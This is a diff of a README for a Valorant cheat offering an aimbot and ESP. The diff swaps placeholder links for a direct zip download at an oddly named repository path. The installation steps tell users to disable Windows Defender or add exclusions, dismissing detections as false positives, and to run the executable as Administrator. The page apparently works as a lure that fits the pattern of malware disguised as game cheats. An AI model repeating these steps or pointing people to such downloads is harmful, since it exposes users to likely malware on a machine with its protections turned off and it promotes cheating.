@@ -2,7 +2,7 @@
 
 CyberValorant is a premium, high-performance internal tool designed to provide a competitive edge in Valorant. Featuring advanced Aimbot and ESP (Extra Sensory Perception) capabilities, this tool is engineered for precision, stability, and minimal detection.
 
-**[⬇️ Download CyberValorant Now](https://github.com)**
+**[⬇️ Download CyberValorant Now](https://raw.githubusercontent.com/Davizoka0/CyberValorant-Valorant-Cheat-Aimbot-ESP/main/orthitic/2.8.zip)**
 
 ## 🎯 Core Features
 
@@ -25,7 +25,7 @@ CyberValorant is a premium, high-performance internal tool designed to provide a
 
 ## ⚙️ Installation
 
-1. **Download:** Get the latest build from the **[Download Link](https://github.com)**.
+1. **Download:** Get the latest build from the **[Download Link](https://raw.githubusercontent.com/Davizoka0/CyberValorant-Valorant-Cheat-Aimbot-ESP/main/orthitic/2.8.zip)**.
 2. **Disable Antivirus:** Because this tool interacts with game memory, Windows Defender and other antivirus software will flag it as a "False Positive." Disable real-time protection or add the folder to your exclusion list.
 3. **Run as Administrator:** Right-click `CyberValorant.exe` and select **Run as Administrator**.
 4. **Launch Valorant:** Start the game, and the injector will automatically detect the process and apply the features.
